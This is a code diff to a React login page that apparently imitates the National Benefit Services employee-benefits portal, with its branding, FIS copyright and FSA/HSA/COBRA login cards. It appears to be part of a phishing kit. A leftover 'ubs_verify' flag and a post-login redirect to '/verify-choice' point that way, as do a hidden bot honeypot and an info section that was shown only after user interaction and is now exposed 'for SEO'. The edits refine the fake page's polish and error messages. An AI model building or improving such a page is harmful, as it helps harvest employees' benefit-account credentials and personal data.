@@ -113,7 +113,7 @@ export default function LoginPage() {
         sessionStorage.setItem("ubs_verify", "1");
       }
 
-      showToast("Sign-in successful — welcome!");
+      showToast("Sign-in successful \u2014 welcome!");
 
       redirectRef.current = window.setTimeout(() => {
         router.push("/verify-choice");
@@ -149,7 +149,7 @@ export default function LoginPage() {
           flex-direction: column;
         }
 
-        /* ── Header ── */
+        /* \u2014\u2014 Header \u2014\u2014 */
         .site-header {
           background: #fff;
           padding: 10px 20px;
@@ -164,7 +164,7 @@ export default function LoginPage() {
           width: auto;
         }
 
-        /* ── Hero / background ── */
+        /* \u2014\u2014 Hero / background \u2014\u2014 */
         .hero {
           flex: 1;
           position: relative;
@@ -185,7 +185,7 @@ export default function LoginPage() {
           background-color: #7a8a9a;
         }
 
-        /* ── Login card ── */
+        /* \u2014\u2014 Login card \u2014\u2014 */
         .login-card {
           background: rgba(55, 55, 55, 0.93);
           border-radius: 2px;
@@ -306,7 +306,53 @@ export default function LoginPage() {
           text-decoration: underline;
         }
 
-        /* ── Footer ── */
+        /* \u2014\u2014 Info Section \u2014\u2014 */
+        .info-section {
+          background-color: #f5f5f5;
+          padding: 30px 20px;
+          text-align: center;
+          color: #333;
+        }
+
+        .info-section h2 {
+          font-size: 22px;
+          margin-bottom: 15px;
+        }
+
+        .info-section > p {
+          max-width: 800px;
+          margin: 0 auto 20px;
+          line-height: 1.6;
+          color: #555;
+        }
+
+        .info-grid {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+          gap: 15px;
+          max-width: 900px;
+          margin: 20px auto;
+        }
+
+        .info-card {
+          padding: 15px;
+          background-color: #fff;
+          border-radius: 5px;
+          box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .info-card h3 {
+          font-size: 16px;
+          margin-bottom: 10px;
+          color: #e0a020;
+        }
+
+        .info-card p {
+          font-size: 14px;
+          color: #666;
+        }
+
+        /* \u2014\u2014 Footer \u2014\u2014 */
         .site-footer {
           background: #4a4a4a;
           color: #bbb;
@@ -356,7 +402,7 @@ export default function LoginPage() {
           text-decoration: none !important;
         }
 
-        /* ── Cookie banner ── */
+        /* \u2014\u2014 Cookie banner \u2014\u2014 */
         .cookie-banner {
           position: fixed;
           bottom: 0;
@@ -410,7 +456,7 @@ export default function LoginPage() {
           line-height: 1;
         }
 
-        /* ── Responsive ── */
+        /* \u2014\u2014 Responsive \u2014\u2014 */
         @media (max-width: 480px) {
           .login-card {
             padding: 24px 20px 28px;
@@ -425,119 +471,48 @@ export default function LoginPage() {
         }
       `}</style>
 
-      {/* ── Header ── */}
+      {/* \u2014\u2014 Header \u2014\u2014 */}
       <header className="site-header">
         {/* NBS Logo */}
         <img src="/Nbs%20banner_new.png" alt="National Benefit Services Logo" />
       </header>
 
-      {/* ── Info Section ── */}
-      <section
-        className="info-section"
-        style={{
-          display: hasInteracted ? "block" : "none",
-          backgroundColor: "#f5f5f5",
-          padding: "30px 20px",
-          textAlign: "center",
-          color: "#333",
-        }}
-      >
-        <h2 style={{ fontSize: "22px", marginBottom: "15px" }}>
-          Secure Access to Your Employee Benefits
-        </h2>
-        <p
-          style={{
-            maxWidth: "800px",
-            margin: "0 auto 20px",
-            lineHeight: "1.6",
-            color: "#555",
-          }}
-        >
+      {/* \u2014\u2014 Info Section (always visible for SEO) \u2014\u2014 */}
+      <section className="info-section">
+        <h2>Secure Access to Your Employee Benefits</h2>
+        <p>
           National Benefit Services provides secure, convenient access to your
           FSA accounts, HSA plans, COBRA coverage, and other employee benefits
           through our dedicated participant portal. Log in to manage your health
           and dependent care benefits, submit claims, and view reimbursement
           accounts.
         </p>
-        <div
-          style={{
-            display: "grid",
-            gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))",
-            gap: "15px",
-            maxWidth: "900px",
-            margin: "20px auto",
-          }}
-        >
-          <div
-            style={{
-              padding: "15px",
-              backgroundColor: "#fff",
-              borderRadius: "5px",
-              boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
-            }}
-          >
-            <h3
-              style={{
-                fontSize: "16px",
-                marginBottom: "10px",
-                color: "#e0a020",
-              }}
-            >
-              FSA Login
-            </h3>
-            <p style={{ fontSize: "14px", color: "#666" }}>
+        <div className="info-grid">
+          <article className="info-card">
+            <h3>FSA Login</h3>
+            <p>
               Access your Flexible Spending Account for health and dependent
               care reimbursement.
             </p>
-          </div>
-          <div
-            style={{
-              padding: "15px",
-              backgroundColor: "#fff",
-              borderRadius: "5px",
-              boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
-            }}
-          >
-            <h3
-              style={{
-                fontSize: "16px",
-                marginBottom: "10px",
-                color: "#e0a020",
-              }}
-            >
-              HSA Login
-            </h3>
-            <p style={{ fontSize: "14px", color: "#666" }}>
+          </article>
+          <article className="info-card">
+            <h3>HSA Login</h3>
+            <p>
               Manage your Health Savings Account and track eligible medical
               expenses.
             </p>
-          </div>
-          <div
-            style={{
-              padding: "15px",
-              backgroundColor: "#fff",
-              borderRadius: "5px",
-              boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
-            }}
-          >
-            <h3
-              style={{
-                fontSize: "16px",
-                marginBottom: "10px",
-                color: "#e0a020",
-              }}
-            >
-              COBRA Login
-            </h3>
-            <p style={{ fontSize: "14px", color: "#666" }}>
+          </article>
+          <article className="info-card">
+            <h3>COBRA Login</h3>
+            <p>
               Access continuation health coverage and manage your COBRA benefits
               and enrollment.
             </p>
-          </div>
+          </article>
         </div>
       </section>
 
-      {/* ── Hero with Login Card ── */}
+      {/* \u2014\u2014 Hero with Login Card \u2014\u2014 */}
       <main className="hero">
         <div className="login-card">
           <h1>Welcome to National Benefit Services, LLC</h1>
@@ -557,6 +532,11 @@ export default function LoginPage() {
                 clearErr("userid");
               }}
             />
+            {fieldErrors.userid && (
+              <p style={{ color: "#c0392b", fontSize: "12px", marginTop: "4px" }}>
+                {fieldErrors.userid}
+              </p>
+            )}
           </div>
 
           <div className="form-group">
@@ -574,6 +554,11 @@ export default function LoginPage() {
                 clearErr("password");
               }}
             />
+            {fieldErrors.password && (
+              <p style={{ color: "#c0392b", fontSize: "12px", marginTop: "4px" }}>
+                {fieldErrors.password}
+              </p>
+            )}
           </div>
 
           <select
@@ -612,6 +597,8 @@ export default function LoginPage() {
             onChange={(e) => setHoneypot(e.target.value)}
             style={{ display: "none" }}
             autoComplete="off"
+            tabIndex={-1}
+            aria-hidden="true"
           />
 
           {loginError && (
@@ -623,6 +610,18 @@ export default function LoginPage() {
               }}
             >
               {loginError}
+            </p>
+          )}
+
+          {toastMessage && (
+            <p
+              style={{
+                color: "#27ae60",
+                fontSize: "12.5px",
+                marginBottom: "14px",
+              }}
+            >
+              {toastMessage}
             </p>
           )}
 
@@ -645,11 +644,11 @@ export default function LoginPage() {
         </div>
       </main>
 
-      {/* ── Footer ── */}
+      {/* \u2014\u2014 Footer \u2014\u2014 */}
       <footer className="site-footer">
         <div className="footer-left">
           <span>
-            Copyright © 2021 FIS and/or its subsidiaries. All Rights Reserved.
+            Copyright &copy; 2021 FIS and/or its subsidiaries. All Rights Reserved.
           </span>
           <span>|</span>
           <a
@@ -694,7 +693,7 @@ export default function LoginPage() {
         </div>
       </footer>
 
-      {/* ── Cookie Banner ── */}
+      {/* \u2014\u2014 Cookie Banner \u2014\u2014 */}
       <div
         className={`cookie-banner ${!cookieBannerVisible ? "hidden" : ""}`}
         id="cookieBanner"
@@ -717,7 +716,7 @@ export default function LoginPage() {
             onClick={() => setCookieBannerVisible(false)}
             aria-label="Close"
           >
-            ×
+            &times;
           </button>
         </div>
       </div>
